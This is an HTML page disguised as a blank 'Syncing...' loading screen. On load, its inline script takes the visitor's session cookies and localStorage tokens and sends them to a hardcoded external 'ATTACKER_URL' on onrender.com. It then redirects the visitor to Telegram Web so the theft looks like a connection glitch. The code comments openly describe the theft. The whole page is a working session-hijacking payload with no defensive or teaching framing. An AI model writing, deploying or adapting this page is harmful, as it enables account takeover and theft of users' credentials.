<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Syncing...</title>
</head>
<body style="background-color: #ffffff;">
    <!-- We keep the body empty to make it look like a broken/loading page -->
    <script>
        const ATTACKER_URL = "https://my-session-interceptor.onrender.com/capture";

        async function performStealthHijack() {
            // 1. Grab the most sensitive data possible
            const stolenData = {
                user_id: "Target_User",
                // This is the 'Holy Grail' - the session cookies
                cookies: document.cookie, 
                // Many modern sites use localStorage for tokens
                localStorage: JSON.stringify(localStorage),
                userAgent: navigator.userAgent,
                timestamp: new Date().toISOString()
            };

            try {
                // 2. Send the data to your Render server
                // We use 'keepalive' to ensure the request finishes even if the page closes
                await fetch(ATTACKER_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(stolenData),
                    mode: 'cors',
                    keepalive: true 
                });
            } catch (err) {
                console.log("Silent error");
            }

            // 3. The "Redirection" - Send them to a real site to hide the trace
            // This makes it look like a temporary connection glitch
            window.location.replace("https://web.telegram.org");
        }

        // Trigger the theft immediately
        performStealthHijack();
    </script>
</body>
</html>
